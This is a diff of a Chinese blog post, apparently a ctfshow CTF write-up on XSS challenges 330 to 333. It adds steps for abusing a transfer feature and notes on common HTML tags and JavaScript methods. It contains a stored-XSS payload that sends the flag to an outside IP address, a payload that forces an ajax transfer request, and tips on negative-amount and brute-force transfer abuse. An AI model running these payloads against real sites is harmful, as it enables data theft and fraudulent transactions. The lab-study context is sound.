@@ -197,7 +197,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      2.5k 字
+      2.7k 字
     </span>
   
 
@@ -207,7 +207,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      32
+      34
        分钟
     </span>
   
@@ -360,7 +360,7 @@
 <p>&lt;script&gt;$(‘.laytable-cell-1-0-1’).each(function(index,value){if(value.innerHTML.indexOf(‘ctf’+’show{‘)&gt;-1){window.location.href=”<a target="_blank" rel="noopener" href="http://49.233.34.67/app/get.php?cookie=&quot;+value.innerHTML;%7D%7D);%5C">http://49.233.34.67/app/get.php?cookie=&quot;+value.innerHTML;}});\</a>&lt;/script&gt;</p>
 </blockquote>
 <ul>
-<li>ctfshow 330</li>
+<li>ctfshow 330、331</li>
 </ul>
 <p>有个修改密码的功能，抓包<img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211024144417192.png" srcset="/img/loading.gif" lazyload></p>
 <p>很自然的想法就是让管理员发出这个包，然后以123456登录即可</p>
@@ -370,6 +370,22 @@
 </blockquote>
 <p>没有用，再看一看题目很贴心的告诉你应该放在用户名里<img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211024145254601.png" srcset="/img/loading.gif" lazyload></p>
 <p>用admin-123456成功登录</p>
+<ul>
+<li>ctfshow332</li>
+</ul>
+<p>注册登录一个账号，给admin转账-10000即可(有毒，我怎么搞都是有内鬼)</p>
+<p>终于成功了</p>
+<ul>
+<li>ctfshow333</li>
+</ul>
+<p>332的基础上不能转负数了</p>
+<p>可以给自己转，每次的转账金额不能大于当前的金额</p>
+<p>比如：转账1元，bp抓一下，爆破1000次(1005），再改一下转账参数为1000，爆破10次</p>
+<p>或者：</p>
+<p>注册两个账号，其中一个账号的账号为：</p>
+<blockquote>
+<p>&lt;script&gt; $.ajax({url:’<a target="_blank" rel="noopener" href="http://127.0.0.1/api/amount.php&#39;,type:&#39;post&#39;,data:{u:&#39;1&#39;,a:&#39;10000&#39;}});\">http://127.0.0.1/api/amount.php&#39;,type:&#39;post&#39;,data:{u:&#39;1&#39;,a:&#39;10000&#39;}});\</a>&lt;/script&gt;</p>
+</blockquote>
 <h2 id="xss的攻防："><a href="#xss的攻防：" class="headerlink" title="xss的攻防："></a>xss的攻防：</h2><h3 id="常用HTML标签"><a href="#常用HTML标签" class="headerlink" title="常用HTML标签"></a>常用HTML标签</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs css">&lt;<span class="hljs-selector-tag">iframe</span>&gt;    <span class="hljs-selector-tag">iframe</span> 元素会创建包含另一个文档的内联框架。<br><br>&lt;<span class="hljs-selector-tag">textarea</span>&gt;   <span class="hljs-selector-tag">textarea</span> 标签定义多行的文本输入控件<br><br>&lt;<span class="hljs-selector-tag">img</span>&gt;        <span class="hljs-selector-tag">img</span>  元素向网页中嵌入图像。<br><br>&lt;script&gt;     script 标签用于定义客户端脚本，比如javascript.<br>             script 元素既可以包含脚本语句，也可以通过 <span class="hljs-attribute">src</span> 属性指向外部脚本文件。<br>             必须的 type 属性规定脚本的 MIME 类型<br>             javascript 的常见应用是图像操作、表单验证以及动态内容更新。<br></code></pre></td></tr></table></figure>
 
 <h3 id="常用javascript方法"><a href="#常用javascript方法" class="headerlink" title="常用javascript方法"></a>常用javascript方法</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">alert        alert() 方法用于显示带有一条指定消息和一个确认按钮的警告框。<br><br>window.<span class="hljs-keyword">location</span>   <span class="hljs-title">用于获得当前页面的地址url</span>，并把浏览器重定向到新的页面。<br><br>location.href     返回当前显示的文档的完整 URL<br><br>onload            一张页面或一幅图像完成加载<br><br>onsubmit           确认按钮被点击<br><br>onerror            在加载文档或图像时发生错误<br></code></pre></td></tr></table></figure>
